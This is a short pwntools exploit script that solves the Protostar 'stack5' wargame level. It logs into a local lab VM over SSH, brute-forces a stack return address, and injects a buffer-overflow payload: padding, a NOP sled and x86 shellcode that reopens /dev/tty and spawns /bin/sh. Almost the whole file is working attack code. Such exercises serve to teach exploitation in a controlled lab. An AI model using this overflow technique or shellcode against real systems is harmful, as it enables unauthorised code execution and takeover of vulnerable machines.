from pwn import *

#gets() doesn't play nice with stdin, so we have to use special shell code
#which closes stdin, reopens /dev/tty, and then does execve() with /bin/sh
shell =  "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

print "Our shell code:"
print disasm(shell)

s = ssh(host='192.168.56.102', user='user', password='user')

# We don't know precisely where the return address
# is going to be in memory but the stack locations depend
# on how the program is called, env variables, etc.
for addr in xrange(0xbffffc00, 0xbffffd00):
    proc = s.run('/opt/protostar/bin/stack5')

    # We figured out the distance between the start of the
    # buffer and  the ret address using gdb (on the vm)
    proc.sendline('\x41'*76 + p32(addr) + '\x90'*256 + shell )
    res = proc.recvline(timeout=1)

    print hex(addr) + ": " + res
    
    if proc.poll():
      proc.close()
      continue
    else:
      proc.interactive()
      break
